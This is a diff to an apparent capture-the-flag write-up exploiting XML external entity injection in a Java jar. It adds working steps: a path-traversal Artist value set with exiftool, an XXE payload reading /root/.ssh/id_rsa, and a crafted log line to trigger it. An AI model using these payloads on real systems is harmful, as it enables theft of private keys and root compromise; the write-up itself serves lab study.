@@ -88,6 +88,38 @@ There's also a split function(at the beggining of the code...) that splits code 
 <br>We can already see there's a vulnerability in that we can exploit from the xml file...
 <br>
 <br>**You can check out this vulnerability from snyk...**
-https://security.snyk.io/vuln/SNYK-JAVA-ORGJDOM-1311147
+<br>https://security.snyk.io/vuln/SNYK-JAVA-ORGJDOM-1311147
 
 ### Expoiting the jar file...
+_**1). Add the artist metadata to a jpg file...**_
+<br> Go to the internet and get a normal jpg file....
+```
+exiftool -Artist="../tmp/author_name"  file.jpg
+```
+Then upload this image file to the tmp directory
+__**2). Create an xml file in the /tmp/ directory...**__
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+   <!ELEMENT foo ANY >
+   <!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa" >]>
+<credits>
+  <author>author_name</author>
+  <image>
+    <uri>/../../../../../../tmp/file.jpg</uri>
+    <views>1</views>
+    <foo>&xxe;</foo>
+  </image>
+  <totalviews>2</totalviews>
+</credits>
+```
+Then save it as: **author_name_creds.txt
+
+__**3). Update the log file's content to match us for our expoit...**__
+```
+echo "222||a||a||/../../../../../../tmp/file.jpg" > /opt/panda_search/redpanda.log
+```
+
+After that, check the contents of the the xml file after a while, you'll see the rsa key contents dumped there....
+
+
